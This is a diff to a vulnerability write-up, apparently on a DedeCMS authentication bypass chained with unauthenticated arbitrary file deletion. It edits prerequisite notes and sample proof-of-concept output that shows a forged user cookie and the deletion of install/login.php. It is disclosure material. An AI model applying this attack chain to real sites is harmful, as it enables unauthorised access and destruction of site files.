@@ -15,7 +15,8 @@ The vulnerability chain allows unauthenticated attackers to delete arbitrary fil
 ## Notes:
 
 - The config member open setting, $cfg_mb_open needs to be set to 'Y'. The default is 'N'.
-- The second vulnerability requires that php-gd is not installed on the target system
+- The second "vulnerability" requires that php-gd is not installed on the target system but this is not critical to exploit the authentication bypass
+  since the captcha is only used for the file delete
 
 ## Vulnerability Analysis:
 
@@ -290,7 +291,7 @@ researcher@neophyte:~$ time ./poc.py 2 192.168.184.175 dede/login.php
 (+) found: DedeUserID=2bzyi;DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0
 (+) done! setting up file delete
 (+) setting up second order delete!
-(+) deleting file install/lol.txt!
+(+) deleting file install/login.php!
 
 real    4m57.724s
 user    1m25.482s
